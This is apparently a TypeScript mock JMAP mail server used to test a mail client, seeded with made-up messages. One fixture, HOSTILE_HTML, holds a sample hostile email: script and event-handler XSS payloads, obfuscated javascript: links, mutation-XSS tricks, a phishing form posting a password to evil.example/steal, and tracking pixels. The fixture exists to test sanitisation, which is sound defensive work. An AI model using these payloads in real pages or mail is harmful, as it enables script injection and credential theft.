// A stand-in JMAP mail server (RFC 8620, RFC 8621) for checking the Mail app: `pnpm check:mail`
// (scripts/mail-check.ts) runs against it, and it can run on its own for trying the app in a browser:
//
//   node scripts/mail-mock.ts [port]     # prints the session URL and token to link in Settings
//
// Enough of JMAP for what server/jmap.ts asks: the session (and /.well-known/jmap), Mailbox/get
// and /query, Identity/get, Email/query (filters, collapseThreads, paging), Email/get (properties,
// body values), Thread/get, Email/set (create, patches, destroy), Email/import (of an uploaded
// message, kept whole as `raw` for checking), Email/changes, EmailSubmission/set with
// onSuccessUpdateEmail, back-references, blob upload and download, and
// an EventSource that sends StateChange events. One account, made-up mail, nothing real.
// POST /mock/deliver (no token) drops a new message into the Inbox, as if it just arrived.

import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http'
import { randomBytes } from 'node:crypto'

type J = Record<string, any> // eslint-disable-line @typescript-eslint/no-explicit-any
type Part = { partId: string; blobId: string; size: number; type: string; name: string | null; cid: string | null; disposition: string | null; charset: string | null }
type Email = J & { id: string; threadId: string; mailboxIds: Record<string, true>; keywords: Record<string, true> }

const ACCOUNT = 'acc1'
const MAILBOXES = [
  { id: 'mb-inbox', name: 'Inbox', role: 'inbox', sortOrder: 1, parentId: null },
  { id: 'mb-drafts', name: 'Drafts', role: 'drafts', sortOrder: 2, parentId: null },
  { id: 'mb-sent', name: 'Sent', role: 'sent', sortOrder: 3, parentId: null },
  { id: 'mb-archive', name: 'Archive', role: 'archive', sortOrder: 4, parentId: null },
  { id: 'mb-junk', name: 'Spam', role: 'junk', sortOrder: 5, parentId: null },
  { id: 'mb-trash', name: 'Trash', role: 'trash', sortOrder: 6, parentId: null },
  { id: 'mb-projects', name: 'Projects', role: null, sortOrder: 10, parentId: null },
  { id: 'mb-receipts', name: 'Receipts', role: null, sortOrder: 11, parentId: 'mb-projects' },
]
export const ME = { name: 'Test User', email: 'me@example.test' }

export type MockJmap = {
  origin: string
  sessionUrl: string
  token: string
  emails: Map<string, Email>
  blobs: Map<string, { type: string; data: Buffer }>
  submissions: J[]
  /** Every method call, in order. */
  calls: string[]
  /** Open EventSource connections. */
  streams: () => number
  deliver: (e: Partial<SeedEmail>) => Email
  state: () => string
  close: () => Promise<void>
}

type SeedEmail = { from: J[]; to?: J[]; cc?: J[]; subject: string; text?: string; html?: string; mailbox?: string; at?: number; seen?: boolean; flagged?: boolean; draft?: boolean; thread?: string; attachments?: { name: string; type: string; data: Buffer | string; cid?: string; inline?: boolean }[]; calendar?: string; messageId?: string; inReplyTo?: string }

const tracker = 'https://tracker.example/open.gif?u=me%40example.test'
export const HOSTILE_HTML = `<!doctype html><html><head><meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/"><style>body { font-family: Georgia, serif; background: url(https://shop.example/bg.png) } .hero { color: #8a2be2; width: expression(alert('css')) } @import url(https://evil.example/x.css); @font-face { font-family: X; src: url(https://evil.example/f.woff) }</style><script>parent.document.cookie</script></head>
<body bgcolor="#fff8f0" onload="alert('body')">
<h1 class="hero">Autumn sale!</h1>
<p onclick="alert('p')">Our <b>best</b> deals, just for you.</p>
<img src="https://shop.example/banner.jpg" alt="Big autumn banner" width="560">
<img src="${tracker}" width="1" height="1" alt="">
<img src="https://tracker.example/hidden.png" style="display:none">
<p><a href="https://shop.example/deals?id=42&amp;ref=mail">See the deals</a> · <a href="javascript:alert('link')">Unsubscribe</a> · <a href="java&#x09;script:alert(2)">Settings</a> · <a href="https://evil.example/login">https://bank.example/login</a></p>
<form action="https://evil.example/steal" method="post"><input name="password" type="password"><button>Log in</button></form>
<svg width="10" height="10"><script>alert('svg')</script><a xlink:href="javascript:alert(3)"><text>x</text></a></svg>
<iframe src="https://evil.example/frame"></iframe>
<object data="https://evil.example/x.swf"></object>
<div style="background-image: url('https://tracker.example/bg.gif'); padding: 8px; border: 1px solid #ddd">Styled box <span style="behavior: url(x.htc); color: green">green</span></div>
<img srcset="https://tracker.example/1x.png 1x, https://tracker.example/2x.png 2x" src="https://shop.example/product.png" alt="Product">
<p style="width:\\65 xpression(alert(4))">escaped expression</p>
<math><mtext><table><mglyph><style><img src=x onerror=alert(5)></style></mglyph></table></mtext></math>
<noscript><p title="</noscript><img src=x onerror=alert(6)>"></p></noscript>
</body></html>`

const INVITE = (method: string) => `BEGIN:VCALENDAR\r\nPRODID:-//Mock//EN\r\nVERSION:2.0\r\nMETHOD:${method}\r\nBEGIN:VEVENT\r\nUID:planning-2026@example.test\r\nSUMMARY:Planning meeting\\, Q4\r\nDTSTART;TZID=Europe/Amsterdam:20261020T100000\r\nDTEND;TZID=Europe/Amsterdam:20261020T110000\r\nLOCATION:Room 4\\, second floor\r\nORGANIZER;CN=Bob Builder:mailto:bob@example.test\r\nATTENDEE;CN=Test User;PARTSTAT=NEEDS-ACTION:mailto:me@example.test\r\nATTENDEE;CN=Carol;PARTSTAT=ACCEPTED:mailto:carol@example.test\r\nBEGIN:VALARM\r\nTRIGGER:-PT15M\r\nACTION:DISPLAY\r\nDESCRIPTION:Reminder\r\nEND:VALARM\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n`

/** A tiny PNG (a 2x2 orange square), for inline and attached pictures. */
export const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAIAAAD91JpzAAAAFklEQVR4nGP4/58BCBj+M4AYTAwMDAD+5gT9zXlCKAAAAABJRU5ErkJggg==', 'base64')

/** `eventSource: false`: a server without push, which has to be polled. */
export async function startMockJmap(opts: { port?: number; token?: string; host?: string; fill?: number; eventSource?: boolean } = {}): Promise<MockJmap> {
  const token = opts.token ?? `mock-${randomBytes(12).toString('hex')}`
  const emails = new Map<string, Email>()
  const blobs = new Map<string, { type: string; data: Buffer }>()
  const values = new Map<string, string>() // blobId of a text part → its text
  const submissions: J[] = []
  const calls: string[] = []
  const changes: { state: number; created: string[]; updated: string[]; destroyed: string[] }[] = []
  let emailState = 1
  let mailboxState = 1
  let nextId = 1
  const streams = new Set<ServerResponse>()
  const id = (p: string) => `${p}${(nextId++).toString(36)}${randomBytes(3).toString('hex')}`

  const blob = (data: Buffer | string, type: string) => {
    const b = id('B')
    const buf = Buffer.isBuffer(data) ? data : Buffer.from(data, 'utf8')
    blobs.set(b, { type, data: buf })
    if (!Buffer.isBuffer(data)) values.set(b, data)
    return { blobId: b, size: buf.length }
  }
  const textPart = (n: number, text: string, type: string, extra: Partial<Part> = {}): Part => ({ partId: String(n), ...blob(text, type), type, name: null, cid: null, disposition: null, charset: 'utf-8', ...extra })

  function changed(created: string[], updated: string[], destroyed: string[], mailboxes = true) {
    emailState++
    if (mailboxes) mailboxState++
    changes.push({ state: emailState, created, updated, destroyed })
    const data = JSON.stringify({ '@type': 'StateChange', changed: { [ACCOUNT]: { Email: String(emailState), Mailbox: String(mailboxState), Thread: String(emailState) } } })
    for (const s of streams) s.write(`event: state\ndata: ${data}\n\n`)
  }

  function make(seed: SeedEmail, record = true): Email {
    const eid = id('M')
    const parts: { text: Part[]; html: Part[]; files: Part[] } = { text: [], html: [], files: [] }
    let n = 1
    if (seed.text !== undefined) parts.text.push(textPart(n++, seed.text, 'text/plain'))
    if (seed.html !== undefined) parts.html.push(textPart(n++, seed.html, 'text/html'))
    if (!parts.html.length) parts.html = parts.text
    if (!parts.text.length && parts.html.length) parts.text = parts.html
    if (seed.calendar) {
      const p = textPart(n++, seed.calendar, 'text/calendar')
      parts.files.push(p)
      parts.files.push({ ...p, partId: String(n++), name: 'invite.ics', type: 'application/ics', disposition: 'attachment' })
    }
    for (const a of seed.attachments ?? []) parts.files.push({ partId: String(n++), ...blob(a.data, a.type), type: a.type, name: a.name, cid: a.cid ? `<${a.cid}>` : null, disposition: a.inline ? 'inline' : 'attachment', charset: null })
    const at = new Date(seed.at ?? Date.now()).toISOString().replace(/\.\d+Z$/, 'Z')
    const plain = seed.text ?? (seed.html ?? '').replace(/<style[\s\S]*?<\/style>|<script[\s\S]*?<\/script>|<[^>]+>/g, ' ')
    const e: Email = {
      id: eid,
      blobId: id('B'),
      threadId: seed.thread ?? id('T'),
      mailboxIds: { [seed.mailbox ?? 'mb-inbox']: true },
      keywords: { ...(seed.seen ? { $seen: true } : {}), ...(seed.flagged ? { $flagged: true } : {}), ...(seed.draft ? { $draft: true } : {}) } as Record<string, true>,
      from: seed.from,
      to: seed.to ?? [ME],
      cc: seed.cc ?? null,
      bcc: null,
      replyTo: null,
      sender: null,
      subject: seed.subject,
      sentAt: at,
      receivedAt: at,
      messageId: [seed.messageId ?? `${eid}@mock.example.test`],
      inReplyTo: seed.inReplyTo ? [seed.inReplyTo] : null,
      references: seed.inReplyTo ? [seed.inReplyTo] : null,
      size: 1000,
      preview: plain.replace(/\s+/g, ' ').trim().slice(0, 200),
      hasAttachment: parts.files.some((p) => p.disposition === 'attachment'),
      textBody: parts.text,
      htmlBody: parts.html,
      attachments: parts.files,
    }
    emails.set(eid, e)
    if (record) changed([eid], [], [])
    return e
  }

  // --- The mail it starts with -----------------------------------------------------------------
  const now = Date.now()
  const min = 60_000
  const alice = { name: 'Alice Example', email: 'alice@example.test' }
  const carol = { name: 'Carol Writer', email: 'carol@example.test' }
  make({ from: [alice], subject: 'Lunch on Friday?', text: 'Hi!\n\nShall we have lunch on Friday? The new place at https://lunch.example/menu looks good.\n\nAlice\n\nOn Mon, 5 Oct 2026, Test User wrote:\n> Let us catch up soon.\n> It has been a while.\n', at: now - 5 * min }, false)
  make({ from: [{ name: 'Autumn Shop', email: 'news@shop.example' }], subject: 'Autumn sale: everything must go', html: HOSTILE_HTML, at: now - 30 * min }, false)
  make({ from: [{ name: 'Bob Builder', email: 'bob@example.test' }], subject: 'Invitation: Planning meeting, Q4', text: 'You are invited to the Q4 planning meeting.', calendar: INVITE('REQUEST'), at: now - 60 * min }, false)
  make(
    {
      from: [{ name: 'Dave Designer', email: 'dave@example.test' }],
      subject: 'The logo files',
      html: '<p>Here are the logo files. The small one inline:</p><p><img src="cid:logo-small@example.test" alt="logo" width="64" height="64"></p><p>And the poster, which is big:</p><p><img src="cid:poster@example.test" alt="poster" width="64" height="64"></p><p>Dave</p>',
      attachments: [
        { name: 'logo-small.png', type: 'image/png', data: PNG, cid: 'logo-small@example.test', inline: true },
        { name: 'poster.png', type: 'image/png', data: Buffer.concat([PNG, Buffer.alloc(1_600_000)]), cid: 'poster@example.test', inline: true },
        { name: 'brief.pdf', type: 'application/pdf', data: '%PDF-1.4 mock' },
        { name: 'logo.png', type: 'image/png', data: PNG },
      ],
      at: now - 2 * 60 * min,
    },
    false,
  )
  const thread = id('T')
  const first = make({ from: [carol], subject: 'Draft chapter', text: 'Here is the first draft of chapter 3. Tell me what you think.\n\nCarol', thread, at: now - 26 * 60 * min, seen: true, messageId: 'chapter-1@example.test' }, false)
  make({ from: [ME], to: [carol], subject: 'Re: Draft chapter', text: 'Looks great! A few notes on page 2.\n\nOn Sat, Carol Writer wrote:\n> Here is the first draft of chapter 3. Tell me what you think.\n', thread, mailbox: 'mb-sent', seen: true, at: now - 25 * 60 * min, messageId: 'chapter-2@example.test', inReplyTo: 'chapter-1@example.test' }, false)
  make({ from: [carol], subject: 'Re: Draft chapter', html: '<p>Thanks, I fixed those.</p><div class="gmail_quote"><div>On Sun, Test User wrote:</div><blockquote type="cite">Looks great! A few notes on page 2.</blockquote></div>', thread, at: now - 3 * 60 * min, flagged: true, messageId: 'chapter-3@example.test', inReplyTo: 'chapter-2@example.test' }, false)
  void first
  make({ from: [ME], to: [alice], subject: 'Half-written note', text: 'Not done yet…', mailbox: 'mb-drafts', draft: true, seen: true, at: now - 4 * 60 * min }, false)
  make({ from: [{ name: 'Prize Center', email: 'win@spam.example' }], subject: 'You have won!!!', text: 'Claim your prize now.', mailbox: 'mb-junk', at: now - 6 * 60 * min }, false)
  make({ from: [{ name: 'Old Newsletter', email: 'old@news.example' }], subject: 'Last week in review', text: 'Old news.', mailbox: 'mb-trash', seen: true, at: now - 48 * 60 * min }, false)
  for (let i = 0; i < (opts.fill ?? 120); i++)
    make({ from: [{ name: `Sender ${i + 1}`, email: `sender${i + 1}@example.test` }], subject: `Update number ${i + 1}`, text: `This is update ${i + 1}.`, seen: i % 3 !== 0, at: now - (8 + i * 3) * 60 * min }, false)

  // --- JMAP ------------------------------------------------------------------------------------
  const inMailboxes = (e: Email) => Object.keys(e.mailboxIds)
  function counts(mb: string) {
    const list = [...emails.values()].filter((e) => e.mailboxIds[mb])
    const threads = new Map<string, boolean>()
    for (const e of list) threads.set(e.threadId, (threads.get(e.threadId) ?? false) || !e.keywords.$seen)
    return { totalEmails: list.length, unreadEmails: list.filter((e) => !e.keywords.$seen).length, totalThreads: threads.size, unreadThreads: [...threads.values()].filter(Boolean).length }
  }
  const has = (list: J[] | null | undefined, q: string) => (list ?? []).some((a) => `${a.name ?? ''} ${a.email}`.toLowerCase().includes(q.toLowerCase()))
  function matches(e: Email, f: J | null): boolean {
    if (!f) return true
    if (f.operator) {
      const r = (f.conditions as J[]).map((c) => matches(e, c))
      return f.operator === 'AND' ? r.every(Boolean) : f.operator === 'OR' ? r.some(Boolean) : !r.some(Boolean)
    }
    if (f.inMailbox && !e.mailboxIds[f.inMailbox]) return false
    if (f.inMailboxOtherThan && inMailboxes(e).every((m) => f.inMailboxOtherThan.includes(m))) return false
    if (f.from && !has(e.from, f.from)) return false
    if (f.to && !has(e.to, f.to)) return false
    if (f.cc && !has(e.cc, f.cc)) return false
    if (f.subject && !e.subject.toLowerCase().includes(String(f.subject).toLowerCase())) return false
    if (f.hasAttachment !== undefined && e.hasAttachment !== f.hasAttachment) return false
    if (f.hasKeyword && !e.keywords[f.hasKeyword]) return false
    if (f.notKeyword && e.keywords[f.notKeyword]) return false
    if (Array.isArray(f.header)) {
      const [name, value] = f.header as [string, string | undefined]
      if (!/^message-id$/i.test(name) || (value !== undefined && !(e.messageId as string[]).some((m) => `<${m}>`.includes(value)))) return false
    }
    if (f.after && e.receivedAt < f.after) return false
    if (f.before && e.receivedAt >= f.before) return false
    if (f.text) {
      const hay = `${e.subject} ${e.preview} ${JSON.stringify(e.from)} ${JSON.stringify(e.to)}`.toLowerCase()
      if (!String(f.text).toLowerCase().split(/\s+/).every((w) => hay.includes(w))) return false
    }
    return true
  }
  const pick = (e: J, props: string[] | null | undefined) => (props ? Object.fromEntries(props.filter((p) => p in e || p === 'bodyValues').map((p) => [p, e[p] ?? null])) : { ...e })

  /** A JSON pointer with "*" (RFC 8620 3.7): every item of an array, flattened. */
  function pointer(value: unknown, path: string): unknown {
    const parts = path.split('/').slice(1)
    const walk = (v: unknown, i: number): unknown => {
      if (i >= parts.length) return v
      const p = parts[i].replace(/~1/g, '/').replace(/~0/g, '~')
      if (p === '*' && Array.isArray(v)) return v.flatMap((x) => {
        const r = walk(x, i + 1)
        return Array.isArray(r) ? r : [r]
      })
      return walk((v as J)?.[p], i + 1)
    }
    return walk(value, 0)
  }

  function api(body: J): J {
    const responses: [string, J, string][] = []
    const created = new Map<string, string>() // creation id → id
    const resolve = (args: J): J | string => {
      const out: J = {}
      for (const [k, v] of Object.entries(args)) {
        if (k.startsWith('#')) {
          const ref = v as J
          const res = responses.find((r) => r[2] === ref.resultOf && r[0] === ref.name)
          if (!res) return 'invalidResultReference'
          out[k.slice(1)] = pointer(res[1], ref.path)
        } else out[k] = v
      }
      return out
    }
    for (const [name, rawArgs, callId] of body.methodCalls as [string, J, string][]) {
      calls.push(name)
      const args = resolve(rawArgs)
      if (typeof args === 'string') {
        responses.push(['error', { type: args }, callId])
        continue
      }
      if (args.accountId !== ACCOUNT) {
        responses.push(['error', { type: 'accountNotFound' }, callId])
        continue
      }
      const ok = (r: J, n = name) => responses.push([n, { accountId: ACCOUNT, ...r }, callId])
      switch (name) {
        case 'Mailbox/get':
          ok({ state: String(mailboxState), list: MAILBOXES.map((m) => pick({ ...m, ...counts(m.id), myRights: {} }, args.properties)), notFound: [] })
          break
        case 'Mailbox/query':
          ok({ ids: MAILBOXES.filter((m) => !args.filter?.role || m.role === args.filter.role).map((m) => m.id), position: 0, queryState: String(mailboxState) })
          break
        case 'Identity/get':
          ok({ state: '1', list: [{ id: 'id1', name: ME.name, email: ME.email, replyTo: null, bcc: null, textSignature: '-- \nTest User', htmlSignature: '', mayDelete: false }], notFound: [] })
          break
        case 'Email/query': {
          let list = [...emails.values()].filter((e) => matches(e, args.filter ?? null)).sort((a, b) => b.receivedAt.localeCompare(a.receivedAt) || b.id.localeCompare(a.id))
          if (args.collapseThreads) {
            const seen = new Set<string>()
            list = list.filter((e) => (seen.has(e.threadId) ? false : (seen.add(e.threadId), true)))
          }
          const position = args.position ?? 0
          ok({ queryState: String(emailState), canCalculateChanges: false, position, ids: list.slice(position, position + (args.limit ?? 256)).map((e) => e.id), ...(args.calculateTotal ? { total: list.length } : {}) })
          break
        }
        case 'Email/get': {
          if (!Array.isArray(args.ids)) {
            responses.push(['error', { type: 'requestTooLarge' }, callId])
            break
          }
          const ids = (args.ids as string[]).map((x) => (x.startsWith('#') ? (created.get(x.slice(1)) ?? x) : x))
          const list: J[] = []
          const notFound: string[] = []
          for (const eid of ids) {
            const e = emails.get(eid)
            if (!e) {
              notFound.push(eid)
              continue
            }
            const out = pick(e, args.properties ?? ['id', 'threadId', 'mailboxIds', 'keywords', 'from', 'to', 'subject', 'receivedAt', 'preview'])
            out.id = e.id
            if (!args.properties || args.properties.includes('bodyValues')) {
              const bv: J = {}
              const want = [...(args.fetchTextBodyValues ? e.textBody : []), ...(args.fetchHTMLBodyValues ? e.htmlBody : []), ...(args.fetchAllBodyValues ? [...e.textBody, ...e.htmlBody, ...e.attachments] : [])]
              for (const p of want as Part[]) {
                const v = values.get(p.blobId)
                if (v === undefined) continue
                const max = args.maxBodyValueBytes ?? 0
                bv[p.partId] = { value: max && v.length > max ? v.slice(0, max) : v, isEncodingProblem: false, isTruncated: !!max && v.length > max }
              }
              out.bodyValues = bv
            }
            list.push(out)
          }
          ok({ state: String(emailState), list, notFound })
          break
        }
        case 'Thread/get': {
          const list = (args.ids as string[]).map((tid) => ({ id: tid, emailIds: [...emails.values()].filter((e) => e.threadId === tid).sort((a, b) => a.receivedAt.localeCompare(b.receivedAt)).map((e) => e.id) })).filter((t) => t.emailIds.length)
          ok({ state: String(emailState), list, notFound: (args.ids as string[]).filter((tid) => !list.some((t) => t.id === tid)) })
          break
        }
        case 'Email/changes': {
          const since = Number(args.sinceState)
          if (!Number.isInteger(since) || since > emailState || since < 1) {
            responses.push(['error', { type: 'cannotCalculateChanges' }, callId])
            break
          }
          const after = changes.filter((c) => c.state > since)
          const createdIds = [...new Set(after.flatMap((c) => c.created))].filter((x) => emails.has(x))
          const destroyedIds = [...new Set(after.flatMap((c) => c.destroyed))]
          ok({ oldState: String(since), newState: String(emailState), hasMoreChanges: false, created: createdIds, updated: [...new Set(after.flatMap((c) => c.updated))].filter((x) => emails.has(x) && !createdIds.includes(x)), destroyed: destroyedIds })
          break
        }
        case 'Email/set': {
          const r = emailSet(args, created)
          ok(r)
          break
        }
        case 'Email/import': {
          // A whole message, uploaded first: read just far enough for the list and for sending.
          const out: J = { oldState: String(emailState), created: {}, notCreated: {} }
          for (const [cid, imp] of Object.entries((args.emails ?? {}) as Record<string, J>)) {
            const b = blobs.get(imp.blobId)
            if (!b) {
              out.notCreated[cid] = { type: 'blobNotFound' }
              continue
            }
            const raw = b.data.toString('utf8')
            const head = raw.split(/\r?\n\r?\n/)[0].replace(/\r?\n[ \t]/g, ' ')
            const header = (name: string) => new RegExp(`^${name}:\\s*(.*)$`, 'im').exec(head)?.[1] ?? ''
            const addr = (v: string) => [...v.matchAll(/<?([^\s<>,"]+@[^\s<>,"]+)>?/g)].map((m) => ({ name: null, email: m[1] }))
            const e = make({ from: addr(header('From')), to: addr(header('To')), subject: header('Subject'), text: '', mailbox: Object.keys(imp.mailboxIds ?? {})[0] ?? 'mb-drafts', seen: !!imp.keywords?.$seen, draft: !!imp.keywords?.$draft }, false)
            e.raw = raw
            created.set(cid, e.id)
            out.created[cid] = { id: e.id, blobId: imp.blobId, threadId: e.threadId, size: b.data.length }
            changed([e.id], [], [])
          }
          out.newState = String(emailState)
          ok(out)
          break
        }
        case 'EmailSubmission/set': {
          const out: J = { oldState: '1', newState: '2', created: {}, notCreated: {} }
          const subIds = new Map<string, string>()
          for (const [cid, sub] of Object.entries((args.create ?? {}) as Record<string, J>)) {
            const emailId = String(sub.emailId).startsWith('#') ? created.get(String(sub.emailId).slice(1)) : sub.emailId
            const e = emailId && emails.get(emailId)
            if (!e || sub.identityId !== 'id1') {
              out.notCreated[cid] = { type: e ? 'forbiddenFrom' : 'invalidProperties', description: e ? 'Unknown identity' : 'No such email' }
              continue
            }
            if (!(e.to?.length || e.cc?.length || e.bcc?.length)) {
              out.notCreated[cid] = { type: 'noRecipients' }
              continue
            }
            const sid = id('S')
            submissions.push({ id: sid, identityId: sub.identityId, emailId: e.id, to: e.to, cc: e.cc, bcc: e.bcc, subject: e.subject })
            out.created[cid] = { id: sid, undoStatus: 'final' }
            subIds.set(cid, e.id)
          }
          ok(out)
          if (args.onSuccessUpdateEmail) {
            const update: J = {}
            for (const [key, patch] of Object.entries(args.onSuccessUpdateEmail as Record<string, J>)) {
              const eid = key.startsWith('#') ? subIds.get(key.slice(1)) : key
              if (eid) update[eid] = patch
            }
            if (Object.keys(update).length) responses.push(['Email/set', { accountId: ACCOUNT, ...emailSet({ update }, created) }, callId])
          }
          break
        }
        default:
          responses.push(['error', { type: 'unknownMethod' }, callId])
      }
    }
    return { methodResponses: responses, sessionState: 'sess1' }
  }

  function applyPatch(e: Email, patch: J) {
    for (const [path, value] of Object.entries(patch)) {
      const [prop, key] = path.split('/')
      if (key !== undefined) {
        const obj = (e[prop] ??= {}) as J
        if (value === null) delete obj[key]
        else obj[key] = value
      } else e[prop] = value
    }
  }

  function emailSet(args: J, created: Map<string, string>): J {
    const out: J = { oldState: String(emailState), created: {}, updated: {}, destroyed: [], notCreated: {}, notUpdated: {}, notDestroyed: {} }
    const made: string[] = []
    const updated: string[] = []
    const destroyed: string[] = []
    let boxes = false
    for (const [cid, c] of Object.entries((args.create ?? {}) as Record<string, J>)) {
      if (!c.mailboxIds || !Object.keys(c.mailboxIds).length) {
        out.notCreated[cid] = { type: 'invalidProperties', properties: ['mailboxIds'] }
        continue
      }
      const text = c.bodyValues?.[c.textBody?.[0]?.partId]?.value ?? ''
      const files = (c.attachments ?? []) as J[]
      if (files.some((a) => !blobs.has(a.blobId))) {
        out.notCreated[cid] = { type: 'blobNotFound' }
        continue
      }
      const e = make({ from: c.from ?? [], to: c.to, cc: c.cc, subject: c.subject ?? '', text, mailbox: Object.keys(c.mailboxIds)[0], seen: !!c.keywords?.$seen, draft: !!c.keywords?.$draft, inReplyTo: c.inReplyTo?.[0] }, false)
      e.bcc = c.bcc ?? null
      e.references = c.references ?? e.references
      for (const a of files) {
        const b = blobs.get(a.blobId)!
        e.attachments.push({ partId: String(e.attachments.length + 10), blobId: a.blobId, size: b.data.length, type: a.type, name: a.name, cid: null, disposition: 'attachment', charset: null })
      }
      e.hasAttachment = files.length > 0
      created.set(cid, e.id)
      out.created[cid] = { id: e.id, blobId: e.blobId, threadId: e.threadId, size: e.size }
      made.push(e.id)
      boxes = true
    }
    for (const [eid, patch] of Object.entries((args.update ?? {}) as Record<string, J>)) {
      const e = emails.get(eid)
      if (!e) {
        out.notUpdated[eid] = { type: 'notFound' }
        continue
      }
      applyPatch(e, patch)
      if (!Object.keys(e.mailboxIds).length) {
        out.notUpdated[eid] = { type: 'invalidProperties', description: 'An email must be in a mailbox' }
        continue
      }
      out.updated[eid] = null
      updated.push(eid)
      boxes = true
    }
    for (const eid of (args.destroy ?? []) as string[]) {
      if (!emails.delete(eid)) {
        out.notDestroyed[eid] = { type: 'notFound' }
        continue
      }
      out.destroyed.push(eid)
      destroyed.push(eid)
    }
    if (made.length || updated.length || destroyed.length) changed(made, updated, destroyed, boxes)
    out.newState = String(emailState)
    return out
  }

  // --- HTTP --------------------------------------------------------------------------------------
  let origin = ''
  const session = () => ({
    capabilities: { 'urn:ietf:params:jmap:core': { maxSizeUpload: 20_000_000, maxCallsInRequest: 32, maxObjectsInGet: 500, maxObjectsInSet: 500 }, 'urn:ietf:params:jmap:mail': {}, 'urn:ietf:params:jmap:submission': {} },
    accounts: { [ACCOUNT]: { name: ME.email, isPersonal: true, isReadOnly: false, accountCapabilities: { 'urn:ietf:params:jmap:mail': {}, 'urn:ietf:params:jmap:submission': {} } } },
    primaryAccounts: { 'urn:ietf:params:jmap:mail': ACCOUNT, 'urn:ietf:params:jmap:submission': ACCOUNT },
    username: ME.email,
    apiUrl: `${origin}/jmap/api/`,
    downloadUrl: `${origin}/jmap/download/{accountId}/{blobId}/{name}?accept={type}`,
    uploadUrl: `${origin}/jmap/upload/{accountId}/`,
    ...(opts.eventSource === false ? {} : { eventSourceUrl: `${origin}/jmap/eventsource/?types={types}&closeafter={closeafter}&ping={ping}` }),
    state: 'sess1',
  })
  const send = (res: ServerResponse, status: number, body: unknown) => res.writeHead(status, { 'Content-Type': 'application/json' }).end(JSON.stringify(body))
  const read = async (req: IncomingMessage) => {
    const chunks: Buffer[] = []
    for await (const c of req) chunks.push(c as Buffer)
    return Buffer.concat(chunks)
  }

  const server: Server = createServer(async (req, res) => {
    const url = new URL(req.url ?? '/', origin)
    if (url.pathname === '/.well-known/jmap') return res.writeHead(307, { Location: '/jmap/session' }).end()
    if (url.pathname === '/mock/deliver' && req.method === 'POST') {
      const body = JSON.parse((await read(req)).toString() || '{}') as Partial<SeedEmail>
      const e = make({ from: [{ name: 'Erin Sender', email: 'erin@example.test' }], subject: 'A new message', text: 'Fresh in.', ...body } as SeedEmail)
      return send(res, 200, { id: e.id })
    }
    if (req.headers.authorization !== `Bearer ${token}`) return send(res, 401, { type: 'about:blank', status: 401, detail: 'Bad token' })
    if (url.pathname === '/jmap/session') return send(res, 200, session())
    if (url.pathname === '/jmap/api/' && req.method === 'POST') {
      const body = JSON.parse((await read(req)).toString())
      if (!body.using?.includes('urn:ietf:params:jmap:mail')) return send(res, 400, { type: 'urn:ietf:params:jmap:error:unknownCapability' })
      return send(res, 200, api(body))
    }
    const up = /^\/jmap\/upload\/([^/]+)\/$/.exec(url.pathname)
    if (up && req.method === 'POST') {
      const data = await read(req)
      const type = req.headers['content-type'] ?? 'application/octet-stream'
      const b = blob(data, type)
      return send(res, 201, { accountId: up[1], blobId: b.blobId, type, size: b.size })
    }
    const down = /^\/jmap\/download\/([^/]+)\/([^/]+)\/([^/]+)$/.exec(url.pathname)
    if (down) {
      const b = blobs.get(decodeURIComponent(down[2]))
      if (!b) return send(res, 404, { type: 'notFound' })
      return res.writeHead(200, { 'Content-Type': url.searchParams.get('accept') ?? b.type, 'Content-Length': String(b.data.length) }).end(b.data)
    }
    if (url.pathname === '/jmap/eventsource/') {
      res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache' })
      res.write(': hello\n\n')
      streams.add(res)
      const ping = Number(url.searchParams.get('ping')) || 0
      const t = ping ? setInterval(() => res.write(`event: ping\ndata: {"interval":${ping}}\n\n`), ping * 1000) : null
      req.on('close', () => {
        if (t) clearInterval(t)
        streams.delete(res)
      })
      return
    }
    send(res, 404, { type: 'notFound' })
  })
  await new Promise<void>((r) => server.listen(opts.port ?? 0, opts.host ?? '127.0.0.1', r))
  origin = `http://${opts.host ?? '127.0.0.1'}:${(server.address() as { port: number }).port}`
  return {
    origin,
    sessionUrl: `${origin}/jmap/session`,
    token,
    emails,
    blobs,
    submissions,
    calls,
    streams: () => streams.size,
    deliver: (e) => make({ from: [{ name: 'Erin Sender', email: 'erin@example.test' }], subject: 'A new message', text: 'Fresh in.', ...e } as SeedEmail),
    state: () => String(emailState),
    close: () =>
      new Promise((r) => {
        for (const s of streams) s.end()
        server.closeAllConnections()
        server.close(() => r())
      }),
  }
}

if (import.meta.main) {
  const port = Number(process.argv[2]) || 8820
  const mock = await startMockJmap({ port, token: process.env.MOCK_TOKEN || 'mock-token-for-local-testing' })
  console.log(`Mock JMAP server: session ${mock.sessionUrl}\ntoken ${mock.token}\nPOST ${mock.origin}/mock/deliver for new mail`)
}
